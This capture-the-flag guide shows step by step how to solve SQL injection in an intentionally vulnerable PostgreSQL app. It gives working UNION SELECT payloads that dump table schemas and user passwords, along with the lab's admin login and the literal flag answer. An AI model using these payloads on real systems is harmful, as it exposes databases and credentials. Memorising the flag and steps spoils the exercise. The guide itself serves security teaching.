# SQL Injection Challenge Guide

This guide demonstrates working SQL injection techniques to extract table schema and DDL from the vulnerable search endpoint.

## Understanding the Vulnerable Query

The search endpoint uses this vulnerable SQL query:
```sql
SELECT id, computer_name, ip_address 
FROM computers 
WHERE computer_name LIKE '%{search_term}%' OR ip_address LIKE '%{search_term}%'
```

**Important**: The query selects **3 columns** (id, computer_name, ip_address), so any UNION SELECT must also return 3 columns.

## Working SQL Injection Payloads

**Important:** The query has `WHERE computer_name LIKE '%{search_term}%' OR ip_address LIKE '%{search_term}%'`, so we need to:
1. Close the LIKE clause with `'`
2. Use `AND 1=0` to ensure the original query returns no results
3. Use UNION to inject our query (must return 3 columns matching: id, computer_name, ip_address)
4. Use integer `1` for the first column to match the `id` (integer) type
5. Comment out the rest with `--`

### 1. Extract Table Names and Columns

**Payload:**
```
' AND 1=0 UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema='public' --
```

**What it does:**
- `'` closes the LIKE clause
- `AND 1=0` ensures the original query returns no results (shows only UNION SELECT data)
- `UNION SELECT` injects our query
- `1` (integer) matches the `id` column type
- Returns table names and column names
- `--` comments out the rest of the query

**Expected Result:** 
- ID column shows `1`
- Table names appear in "Computer Name" column
- Column names appear in "IP Address" column

### 2. Extract Just Table Names

**Payload:**
```
' AND 1=0 UNION SELECT 1, tablename, null FROM pg_tables WHERE schemaname='public' --`
```

**What it does:**
- Uses PostgreSQL's pg_tables system catalog
- Returns only table names (other columns are null)
- Simpler alternative for just getting table names

**Expected Result:** 
- ID column shows `1`
- Table names appear in "Computer Name" column

### 3. Extract the Flag

**Payload:**
```
' AND 1=0 UNION SELECT 1, flag, null FROM flag --
```

**What it does:**
- Extracts the flag from the `flag` table
- Returns the flag value

**Expected Result:** 
- ID column shows `1`
- Flag value appears in "Computer Name" column: `flag{well_done_cafebeef0e4d}`

## Step-by-Step Manual Extraction

### Step 1: Find All Tables and Columns

1. Login as admin (username: `admin`, password: `admin123`)
2. Go to the search box
3. Enter: `' AND 1=0 UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema='public' --`
4. Click Search
5. Look at the results:
   - **ID** column shows `1`
   - **Table names** appear in "Computer Name" column
   - **Column names** appear in "IP Address" column
6. Filter out the actual computer data (SERVER-01, WORKSTATION-05, etc.)

**Expected Results:**
- users table with columns: id, username, password, role
- computers table with columns: id, computer_name, ip_address
- flag table with columns: id, flag

### Step 2: Extract Just Table Names (Alternative)

If you only want table names:
```
' AND 1=0 UNION SELECT 1, tablename, null FROM pg_tables WHERE schemaname='public' --
```

### Step 3: Extract the Flag

1. In the search box, enter: `' AND 1=0 UNION SELECT 1, flag, null FROM flag --`
2. Click Search
3. The flag will appear in the "Computer Name" column: `flag{well_done_cafebeef0e4d}`

### Step 4: Reconstruct DDL

Based on the extracted column information, you can reconstruct the CREATE TABLE statements:

**users table:**
```sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    role VARCHAR(20) NOT NULL DEFAULT 'user'
);
```

**computers table:**
```sql
CREATE TABLE computers (
    id SERIAL PRIMARY KEY,
    computer_name VARCHAR(100) NOT NULL,
    ip_address VARCHAR(15) NOT NULL
);
```

**flag table:**
```sql
CREATE TABLE flag (
    id SERIAL PRIMARY KEY,
    flag VARCHAR(100) NOT NULL
);
```

## Using the Demo Script

A Python script is provided to automate the extraction:

```bash
# Make sure the application is running
docker-compose up

# In another terminal, run the demo script
python3 sql_injection_demo.py
```

The script will:
1. Login as admin
2. Extract all table names
3. Extract columns for each table
4. Reconstruct DDL statements
5. Display complete schema information
6. Extract the flag

## Common Issues and Solutions

### Issue: UNION SELECT returns error about mismatched columns
**Solution:** Make sure your UNION SELECT returns exactly 3 columns. Use `null` to fill extra columns.

### Issue: No results returned
**Solution:** 
- Check that you're logged in as admin
- Verify the payload syntax (quotes, spaces, comments)
- Try alternative methods (pg_tables instead of information_schema)

### Issue: Results show actual computer data
**Solution:** Use `AND 1=0` before UNION to ensure the original query returns no results, showing only the UNION SELECT data.

### Issue: Type mismatch errors
**Solution:** Use integer `1` for the first column to match the `id` (integer) type. The other columns can be text.

## Advanced Techniques

### Extract Data from Tables

To extract actual data from the users table:
```
' AND 1=0 UNION SELECT 1, username, password FROM users --
```

**Warning:** This will expose passwords! This is why SQL injection is dangerous.

### Extract More Column Details

To get column constraints, defaults, etc.:
```
' AND 1=0 UNION SELECT 1, column_name, column_default FROM information_schema.columns WHERE table_schema='public' AND table_name='users' --
```

## Security Notes

⚠️ **This application is intentionally vulnerable for educational purposes.**

In production applications:
- Always use parameterized queries/prepared statements
- Never concatenate user input directly into SQL queries
- Validate and sanitize all user inputs
- Use an ORM (Object-Relational Mapping) framework
- Implement proper access controls
- Regularly audit code for SQL injection vulnerabilities

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PostgreSQL Information Schema](https://www.postgresql.org/docs/current/information-schema.html)
- [PostgreSQL System Catalogs](https://www.postgresql.org/docs/current/catalogs.html)
